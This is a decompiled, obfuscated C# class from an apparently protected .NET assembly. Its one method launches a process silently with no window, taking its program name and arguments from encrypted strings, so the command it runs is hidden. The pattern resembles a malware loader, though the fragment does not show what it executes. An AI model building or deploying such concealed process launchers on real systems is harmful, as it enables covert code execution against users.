using System.Diagnostics;
using ns0;

namespace ns2;

internal class Class5
{
	public static void smethod_0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		Process val = new Process();
		val.get_StartInfo().set_FileName(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_68());
		val.get_StartInfo().set_Arguments(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_69() + Class2.string_4 + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_70() + Class2.string_3[0] + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_71());
		val.get_StartInfo().set_UseShellExecute(false);
		val.get_StartInfo().set_CreateNoWindow(true);
		val.Start();
		val.WaitForExit();
	}
}
